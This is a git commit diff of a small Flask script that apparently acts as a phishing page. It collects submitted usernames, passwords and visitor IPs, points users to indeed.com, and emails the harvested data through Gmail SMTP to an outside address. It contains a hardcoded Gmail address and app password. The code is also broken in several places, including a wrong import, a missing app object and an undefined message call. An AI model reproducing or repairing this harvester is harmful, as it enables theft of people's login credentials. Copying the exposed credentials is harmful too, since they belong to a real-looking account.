f6597581e7a2a1c0eb13fc390736035e76039c94
busgandy <39296111+busgandy@users.noreply.github.com>
2020-09-26 02:37:35 +0100

    Update main.py

--- app/main.py
+++ app/main.py
@@ -1,37 +1,39 @@
-from flask import Flask, render_template, request, session
+from flask import Flask, render_template, requests, session
 import smtplib
 
-app = Flask(__name__) 
 
 usernames = []
 passwords = []
 ip_every = []
 
-totals = (f"The details are: {usernames} \n {passwords}\n and the ip is {ip_every}")
+totals = f"The details are: {usernames} \n {passwords}\n and the ip is {ip_every}"
+
 
 @app.route("/", method=["GET", "POST"])
 def index():
 	if request.method == "POST":
 		username = request.form.get("username")
 		password = request.form.get("password")
-		ip_addresses = flask.request.remote_addr
 		usernames.append(username)
 		passwords.append(password)
-    		ip_every.append(ip_addresses)
-	return render_template("https://indeed.com")
+		ip_address = flask.request.remote_addr
+		ip_every.append(ip_address)
 
-EMAIL_ADDRESS = ("busganda@gmail.com")
-EMAIL_PASSWORD = ("mkarxgucgtnvymys")
+	return render_template ("https://indeed.com")
+
+
+EMAIL_ADDRESS = "busganda@gmail.com"
+EMAIL_PASSWORD = "mkarxgucgtnvymys"
 
 with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
 	smtp.ehlo()
 	smtp.starttls()
 	smtp.ehlo()
 
-	smtp.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
+	smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
 	
-	subject = ("Just Testing")
-	body = (ip_every)
+	subject = "Just Testing"
+	body = ip_every
 	msg (f"Subject: {subject}\n\n{body}")
 	smtp.sendmail("busganda@gmail.com", "gideonbusayo@gmail.com", msg)
 
